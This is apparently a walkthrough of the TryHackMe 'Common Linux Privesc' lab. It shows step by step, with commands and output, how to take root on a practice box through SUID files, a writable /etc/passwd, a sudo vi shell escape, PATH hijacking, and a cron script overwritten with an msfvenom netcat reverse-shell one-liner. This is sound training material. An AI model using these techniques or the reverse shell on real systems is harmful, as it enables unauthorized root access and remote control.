---
title: "TryHackMe - Common Linux Privesc"
categories:
  - TryHackMe
tags:
  - linux
  - enumeration
  - exploit
  - writeup
  - tryhackme
  - hacking
  - privilege 
  - escalation
---
A room explaining common Linux privilege escalation

## Understanding Privesc
- At it's core, Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
- Privilege escalation is crucial, because it lets you gain system administrator levels of access. 

## Direction of Privilege Escalation
<center><a href="https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/tree.png"><img src="https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/tree.png"></a></center><br>

Two main privesc varians:
- **Horizontal privilege escalation**
    - This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you.
    - We can gain access tto another normal privilege user to inherit whatever files and access that user has.
- **Vertical privilege escalation (privilege elevation)**:
    - This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised.
    - For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges.

## Enumeration
- Using [LinEnum](https://github.com/rebootuser/LinEnum)
- Using [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

#### First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.
```bash
$ ssh user3@10.10.200.198
...
user3@polobox:~$
```

#### What is the target's hostname?
```bash
user3@polobox:~$

# polobox
```

#### Look at the output of /etc/passwd how many "user[x]" are there on the system?
```bash
user3@polobox:~$ cat /etc/passwd

ser1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
sshd:x:122:65534::/run/sshd:/usr/sbin/nologin
```

#### How many available shells are there on the system?
```bash
user3@polobox:~$ cat /etc/shells 

# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```
#### What is the name of the bash script that is set to run every 5 minutes by cron?
```bash
user3@polobox:~$ less /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

#### What critical file has had its permissions changed to allow some users to write to it?
```bash
user3@polobox:~$ wget <local-IP>/LinEnum.sh
user3@polobox:~$ chmod +x LinEnum.sh
user3@polobox:~$ ./LinEnum.sh
...
[-] Can we read/write sensitive files:
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd
...
```

## Abusing SUID/GUID Files
- Finding SUID binaries:
    ```bash
    $ find / -perm -u=s -type f 2>/dev/null

    # find - Initiates the "find" command
    # / - Searches the whole file system
    # -perm - searches for files with specific permissions
    # -u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
    # -type f - Only search for files
    # 2>/dev/null - Suppresses errors
    ```

#### What is the path of the file in user3's directory that stands out to you?
```bash
user3@polobox:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  shell  Templates  Videos
```

#### We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it! We can do this by running: "./shell"
```bash
user3@polobox:~$ ls -l shell 
-rwsr-xr-x 1 root root 8392 Jun  4  2019 shell
user3@polobox:~$ ./shell 
You Can't Find Me
Welcome to Linux Lite 4.4 user3
 
Sunday 10 January 2021, 23:26:37
Memory Usage: 335/1991MB (16.83%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~#
```
Congratulations! You should now have a shell as root user, well done!

## Exploiting Writeable /etc/passwd
- The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol.
    ```bash
    test:x:0:0:root:/root:/bin/bash

    # [as divided by colon (:)]
    # Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    # Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    # User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    # Group ID (GID): The primary group ID (stored in /etc/group file)
    # User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    # Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    # Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
    ```
- It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

#### First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"
```bash
user3@polobox:~$ su user7
Password: 
Welcome to Linux Lite 4.4 user7
 
Monday 11 January 2021, 00:52:39
Memory Usage: 330/1991MB (16.57%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user7@polobox:/home/user3$
```

#### Having read the information above, what direction privilege escalation is this attack?
> We can escalate our privilege to above user (root), so it's Vertical.

#### Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]". What is the hash created by using this command with the salt, "new" and the password "123"?
```bash
user7@polobox:/home/user3$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

#### Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?
```bash
root:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

#### Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!
```bash
user7@polobox:/home/user3$ nano /etc/passwd
user7@polobox:/home/user3$ cat /etc/passwd
root:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
...
```

#### Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!
```bash
user7@polobox:/home/user3$ su root
Password: 
Welcome to Linux Lite 4.4
 
You are running in superuser mode, be very careful.
 
Monday 11 January 2021, 00:59:05
Memory Usage: 333/1991MB (16.73%)
Disk Usage: 6/217GB (3%)
 
root@polobox:/home/user3#
```

## Escaping Vi Editor
- Check privileges
    ```bash
    sudo -l
    ```
- Check misconfigured binaries at [GTFOBins](https://gtfobins.github.io/).

#### First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"
```bash
root@polobox:/home/user3# exit
exit
user7@polobox:/home/user3$ su user8
Password: 
Welcome to Linux Lite 4.4 user8
 
Monday 11 January 2021, 01:02:32
Memory Usage: 333/1991MB (16.73%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user8@polobox:/home/user3$
```

#### Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?
```bash
user8@polobox:/home/user3$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
```

#### So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.
```bash
user8@polobox:/home/user3$ sudo vi
```

#### Now, type ":!sh" to open a shell!
```bash
user8@polobox:/home/user3$ sudo vi

# whoami
root
```

## Exploiting Crontab
- The Cron daemon is a long-running process that executes commands at specific dates and times.
- You can use this to schedule activities, either as one-time events or as recurring tasks. 
- You can create a crontab file containing commands and instructions for the Cron daemon to execute.
- We can use the command "`cat /etc/crontab`" to view what cron jobs are scheduled.
- Cronjobs format:
    ```bash
    #  m   h dom mon dow user  command
    17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly

    # # = ID
    # m = Minute
    # h = Hour
    # dom = Day of the month
    # mon = Month
    # dow = Day of the week
    # user = What user the command will run as
    # command = What command should be run
    ```

## First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"
```bash
user8@polobox:/home/user3$ su user4
Password: 
Welcome to Linux Lite 4.4 user4
 
Monday 11 January 2021, 01:06:55
Memory Usage: 336/1991MB (16.88%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user4@polobox:/home/user3$
```

#### Now, on our host machine- let's create a payload for our cron exploit using msfvenom. 
```bash
$ msfvenom 
```

#### What is the flag to specify a payload in msfvenom?
```bash
$ msfvenom -p
```

#### Create a payload using: "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"
```bash
$ msfvenom -p cmd/unix/reverse_netcat lhost=10.11.25.205 lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 90 bytes
mkfifo /tmp/uvyy; nc 10.11.25.205 8888 0</tmp/uvyy | /bin/sh >/tmp/uvyy 2>&1; rm /tmp/uvyy
```

#### What directory is the "autoscript.sh" under?
```bash
user4@polobox:/home/user3$ find / -type f -name "autoscript.sh" 2>/dev/null
/home/user4/Desktop/autoscript.sh
```

#### Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"
```bash
user4@polobox:~/Desktop$ echo "mkfifo /tmp/uvyy; nc 10.11.25.205 8888 0</tmp/uvyy | /bin/sh >/tmp/uvyy 2>&1; rm /tmp/uvyy" > autoscript.sh
```

#### After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvp 8888" and wait for our shell to land!
```bash
$ nc -lnvp 8888
```

#### After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!
```bash
$ nc -lnvp 8888                                                                                          1 ⨯
listening on [any] 8888 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.104.96] 59672

whoami
root
```

## Exploiting PATH Variable
- PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. 
- When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.
- It is very simple to view the Path of the relevant user with help of the command "echo $PATH".
- We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

#### Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"
```bash
user3@polobox:~$ su user5
Password: 
Welcome to Linux Lite 4.4 user5
 
Monday 11 January 2021, 02:03:42
Memory Usage: 332/1991MB (16.68%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user5@polobox:/home/user3$
```

#### Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?
```bash
user5@polobox:~$ ./script 
Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
# probably ls command
```

#### Now we know what command to imitate, let's change directory to "tmp". 
```bash
user5@polobox:~$ cd /tmp
user5@polobox:/tmp$
```

#### Crate imitation executable: `echo "[whatever command we want to run]" > [name of the executable we're imitating]`. What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating
```bash
user5@polobox:/tmp$ echo "/bin/bash" > ls
```

#### Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
```bash
user5@polobox:/tmp$ chmod +x ls
```

#### Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "`ls`" stored! We do this using the command "`export PATH=/tmp:$PATH`". 
```bash
user5@polobox:/tmp$ export PATH=/tmp:$PATH
user5@polobox:/tmp$ ls
Welcome to Linux Lite 4.4 user5
 
Monday 11 January 2021, 02:12:38
Memory Usage: 336/1991MB (16.88%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user5@polobox:/tmp$
user5@polobox:/tmp$
```

#### Now, change directory back to user5's home directory.
```bash
user5@polobox:~$ cd ~
```

#### Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!
```bash
user5@polobox:~$ ./script 
Welcome to Linux Lite 4.4 user5
 
Monday 11 January 2021, 02:15:43
Memory Usage: 343/1991MB (17.23%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~# 
```

## Further Learning
- [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/content/](https://sushant747.gitbooks.io/total-oscp-guide/content/)
- [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)